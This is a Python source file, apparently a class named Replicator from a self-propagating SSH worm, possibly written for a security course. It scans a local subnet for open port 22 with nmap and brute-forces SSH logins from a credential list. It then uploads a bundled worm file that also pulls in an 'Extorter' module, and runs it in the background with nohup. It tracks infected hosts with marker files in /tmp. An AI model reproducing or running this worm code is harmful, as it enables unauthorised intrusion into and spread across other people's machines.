import paramiko
import nmap
import socket
import os
import shutil
import subprocess

try:
	dprint
except:
	def dprint(msg, debug=True):
		if debug:
			print(msg)

class Replicator(object):

	# The file marking whether the worm should spread
	INFECTED_MARKER_FILE      = "/tmp/infected.txt"
	DEBUG_OUTPUT_FILE         = "/tmp/output.txt"
	HOST_MARKER_FILE          = "/tmp/host.txt"
	COMPILE_TMP_DIRECTORY     = ".tmp"

	# Connection indicators
	SUCCESSFUL_CONNECTION = 0
	BAD_CREDENTIALS = 1
	CONNECTION_ERROR = 3

	sshClient      = None
	sftpClient     = None
	host           = None
	credentialList = None

	def __init__(self, credList, debug=True):
		self.credentialList = credList
		self.sshClient = paramiko.SSHClient()
		self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		self.debug = debug

	def spreadAndExecute(self, isHost, executionFile):

		if isHost:
			self.compileWorm(executionFile, isHost)
			self.getSftpClient().put(Replicator.COMPILE_TMP_DIRECTORY + "/" + os.path.basename(executionFile), executionFile)
		else:
			self.getSftpClient().put(executionFile, executionFile)

		self.sshClient.exec_command("chmod a+x " + executionFile)

		if self.debug:
			self.sshClient.exec_command("nohup python " + executionFile + " > " + Replicator.DEBUG_OUTPUT_FILE + " 2>&1 &")
			# self.sshClient.exec_command("nohup python " + executionFile + " >> " + Replicator.DEBUG_OUTPUT_FILE + " &")
		else:
			self.sshClient.exec_command("nohup python " + executionFile + " &")


	def tryCredentials(self, host, username, password):
		try:
			# Reset the sftp client
			self.sftpClient = None
			self.sshClient.connect(host, username=username, password=password)

		except socket.error:
			return Replicator.CONNECTION_ERROR
		except paramiko.SSHException:
			return Replicator.BAD_CREDENTIALS
		except EOFError:
			return Replicator.CONNECTION_ERROR

		return Replicator.SUCCESSFUL_CONNECTION

	def compileWorm(self, executionFile, isHost=False):

		baseFile = os.path.basename(executionFile)

		# Create temporary directory to put the generated file
		if os.path.isdir(Replicator.COMPILE_TMP_DIRECTORY):
			self.deleteCompiledWorm()

		os.makedirs(Replicator.COMPILE_TMP_DIRECTORY)

		# Copy worm.py
		shutil.copy2(baseFile, Replicator.COMPILE_TMP_DIRECTORY)

		fExecFile = open(baseFile, "r")
		fExecContents = fExecFile.read()
		fExecFile.close()

		filesToInject = [("Replicator.py", "from Replicator" + " import Replicator"),
			("Extorter.py", "from Extorter" + " import Extorter")]

		for file, injectStatement in filesToInject:
			f = open(file, "r")
			fContents = f.read()
			f.close()

			fExecContents = fExecContents.replace(injectStatement, fContents, 1)

		if isHost:
			fExecContents = fExecContents.replace("hostIP = None", "hostIP = '" + Replicator.getMyIP('eth2') + "'")

		# Find the location in worm.py to dump the Replicator class in
		f = open(Replicator.COMPILE_TMP_DIRECTORY + "/" + baseFile, "w")
		f.write(fExecContents)
		f.close()

	def deleteCompiledWorm(self):
		shutil.rmtree(Replicator.COMPILE_TMP_DIRECTORY)

	def attackSystem(self, host):

		attemptResults = None

		for (username, password) in self.credentialList:

			attemptResults = self.tryCredentials(host, username, password)

			if attemptResults == Replicator.SUCCESSFUL_CONNECTION:
				dprint('(' + username + ', ' + password + '): ' + Replicator.desc(attemptResults), self.debug)
				return (attemptResults, self.sshClient) # Possibly need a copy of the instance?

		return (attemptResults, None)

	def remoteSystemIsInfected(self):
		return Replicator.remoteFileExists(self.getSftpClient(), Replicator.INFECTED_MARKER_FILE)

	def remoteSystemIsHost(self):
		return Replicator.remoteFileExists(self.getSftpClient(), Replicator.HOST_MARKER_FILE)

	def getSftpClient(self):
		if self.sftpClient is None:
			self.sftpClient = self.sshClient.open_sftp()

		return self.sftpClient

	@staticmethod
	def remoteFileExists(sftp, path):
		try:
			sftp.stat(path)
			return True
		except IOError:
			return False
		except:
			return False

	@staticmethod
	def isInfectedSystem():
		return os.path.isfile(Replicator.INFECTED_MARKER_FILE)

	@staticmethod
	def markInfected():
		open(Replicator.INFECTED_MARKER_FILE, 'a').close()

	@staticmethod
	def markAsHost():
		open(Replicator.HOST_MARKER_FILE, 'a').close()

	@staticmethod
	def getMyIP(ifname):
		# Using other method for getting current IP. Original example given in the sample
		# code was generating errors.
		ip = subprocess.check_output("echo $(ifconfig " + ifname + " | awk -F: '/inet addr:/ {print $2}' | awk '{ print $1 }')", shell=True)

		# Get rid of newline
		return ip.strip().decode('utf-8')

	@staticmethod
	def desc(status):
		if status == Replicator.SUCCESSFUL_CONNECTION:
			return "SUCCESSFUL_CONNECTION"
		elif status == Replicator.BAD_CREDENTIALS:
			return "BAD_CREDENTIALS"
		elif status == Replicator.CONNECTION_ERROR:
			return "CONNECTION_ERROR"

	@staticmethod
	def getHostsOnTheSameNetwork():
		
		portScanner = nmap.PortScanner()

		portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

		# Scan the network for hosts
		hostInfo = portScanner.all_hosts()

		# Hosts that are alive
		runningHosts = []

		for host in hostInfo:
			if portScanner[host].state() == "up":
				runningHosts.append(host)

		return runningHosts
